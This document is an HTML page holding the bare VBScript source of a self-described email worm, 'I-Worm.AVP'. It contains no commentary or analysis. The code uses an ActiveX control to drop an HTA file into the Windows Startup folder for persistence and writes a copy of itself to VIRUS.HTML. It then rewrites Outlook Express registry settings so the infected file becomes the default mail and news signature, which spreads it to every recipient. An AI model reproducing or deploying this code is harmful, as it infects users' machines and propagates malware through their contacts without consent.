<HTML>
<BODY>
<object classid= "clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" id= "hmlfile">
</object>
<SCRIPT LANGUAGE = "VBScript">
hmlfile.path = "C:\WINDOWS\START MENU\PROGRAMS\STARTUP\avp.hta"
hmlfile.doc = "<" & "HTML>
<" & "HEAD>
<" & "HTA:APPLICATION ID=""hO"" WINDOWSTATE=Minimize>
<" & "/HEAD>
<" & "BODY>
<" & "SCRIPT LANGUAGE=""VBScript"">
" & chr(13) & "" & chr(10) & "' I-Worm.AVP Coded by zoo" & chr(13) & "" & chr(10) & "on error resume next" & chr(13) & "" & chr(10) & "Dim fso,ind,hml,wshl" & chr(13) & "" & chr(10) & "Set fso=CreateObject(""Scripting.FileSystemObject""):set ind=fso.OpenTextFile(""C:\WINDOWS\START MENU\PROGRAMS\STARTUP\avp.hta"",1):set hml=fso.CreateTextFile(""C:\WINDOWS\VIRUS.HTML"",True):hml.writeline ""
<" & """&""HTML>
<" & """&""BODY>"":hml.writeline ""
<" & "object classid= """"clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"""" id= """"hmlfile"""">"":hml.writeline ""<" & "/object>"":hml.writeline ""
<" & "SCRIPT LANGUAGE = """"VBScript"""">
"":hml.writeline ""hmlfile.path = """"C:\WINDOWS\START MENU\PROGRAMS\STARTUP\avp.hta"""""":hml.write     ""hmlfile.doc = """"""" & chr(13) & "" & chr(10) & "t = 0 : s = 0 :c=""""" & chr(13) & "" & chr(10) & "while t = 0" & chr(13) & "" & chr(10) & " p = c" & chr(13) & "" & chr(10) & " c = ind.read(1)" & chr(13) & "" & chr(10) & " if p = ""<" & """ AND c = ""H"" AND s = 0 then hml.Write ""<" & """"" & """""" : s = 1 " & chr(13) & "" & chr(10) & " if c = ""J"" AND p = "">"" then t = 1" & chr(13) & "" & chr(10) & " if s = 1 then " & chr(13) & "" & chr(10) & "  if c = chr(13) then hml.Write """""" & chr(13) & """""" " & chr(13) & "" & chr(10) & "  if c = chr(10) then hml.Write """""" & chr(10) & """""" : c= chr(13)" & chr(13) & "" & chr(10) & "  if c = """""""" then hml.Write """""""""""" : c= chr(13)" & chr(13) & "" & chr(10) & "  if c = ""<" & """ then hml.write ""<" & """"" & """""" : c = chr(13) " & chr(13) & "" & chr(10) & "  if c <" & "> chr(13) then hml.Write c" & chr(13) & "" & chr(10) & " end if" & chr(13) & "" & chr(10) & "wend" & chr(13) & "" & chr(10) & "ind.close:hml.Writeline """""""":hml.Writeline ""hmlfile.Write"":hml.writeline ""
<" & """&""/SCRIPT>
"":hml.Writeline ""<" & """&""/BODY><" & """&""/HTML>"":hml.close:Set wshl = CreateObject(""WScript.Shell""):rr = wshl.RegRead(""HKEY_CURRENT_USER\Identities\Default User ID""):rr = ""HKEY_CURRENT_USER\Identities\""&rr&""\Software\Microsoft\Outlook Express\5.0\"":wshl.RegWrite rr&""Signatures\00000123\file"",""C:\WINDOWS\VIRUS.HTML"":wshl.RegWrite rr&""Signatures\00000123\name"",""System Signature"":wshl.RegWrite rr&""Signatures\00000123\text"","""":wshl.RegWrite rr&""Signatures\00000123\type"",2,""REG_DWORD"":wshl.RegWrite rr&""Signatures\Default Signature"",""00000123"":wshl.RegWrite rr&""Signature Flags"",1,""REG_DWORD"":wshl.RegWrite rr&""Mail\Message Send HTML"",1,""REG_DWORD"":wshl.RegWrite rr&""News\Message Send HTML"",1,""REG_DWORD""" & chr(13) & "" & chr(10) & "if left(date,5) = ""10/10"" then MsgBox ""Kaspersky Anti-Virus"",0,""I-Worm.AVP""" & chr(13) & "" & chr(10) & "Self.Close" & chr(13) & "" & chr(10) & "<" & "/SCRIPT><" & "/BODY><" & "/HTML>J"
hmlfile.Write
</SCRIPT>
</BODY></HTML>
